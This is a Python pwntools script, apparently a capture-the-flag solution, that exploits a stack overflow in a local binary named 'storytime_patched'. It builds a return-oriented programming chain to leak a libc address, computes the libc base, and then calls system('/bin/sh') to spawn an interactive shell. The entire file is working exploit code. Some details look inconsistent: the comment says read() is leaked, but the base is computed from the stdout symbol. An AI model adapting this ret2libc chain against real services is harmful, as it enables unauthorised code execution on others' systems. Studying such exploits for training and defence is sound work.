from pwn import *
context.binary = './storytime_patched'
io = process('./storytime_patched')
# io = gdb.debug('./storytime_patched', '''
#     b main
#     c
# ''')
elf = ELF('./storytime_patched')
libc = ELF('./libc.so.6')
RET_ADDR_OFFSET = cyclic_find(0x6161616f)
BSS_ADDRESS = 0x0000000000601040


def leak_libc():
    log.info("Generating ROP Payload...")
    rop = ROP(elf)
    rop.call('read', [elf.got['read'], BSS_ADDRESS]) # write address of read() to bss
    rop.call('write', [1, BSS_ADDRESS]) # print bss to stdout
    rop.call('main') # exploit again @ vuln func
    log.info(f"ROP Payload:\n{rop.dump()}")
    payload = flat({
        RET_ADDR_OFFSET : rop.build()
    })
    io.sendline(payload)
    io.recvuntil(b'Tell me a story:')
    read_addr = unpack(io.recvn(8)[2:], 'all')
    log.info(f"Leaked read() addr: {hex(read_addr)}")
    libc.address = read_addr - libc.symbols['_IO_2_1_stdout_']
    log.success(f"Set libc base address: {hex(libc.address)}")

leak_libc()
log.info("Generating ROP Payload...")
rop = ROP([elf, libc])
rop.call('system', [next(libc.search(b'/bin/sh'))])
log.info(f"ROP Payload:\n{rop.dump()}")
io.sendline(flat({
    RET_ADDR_OFFSET : rop.build()
}))
io.recvuntil(b'Tell me a story:')
log.success("Got Shell!")
io.interactive()
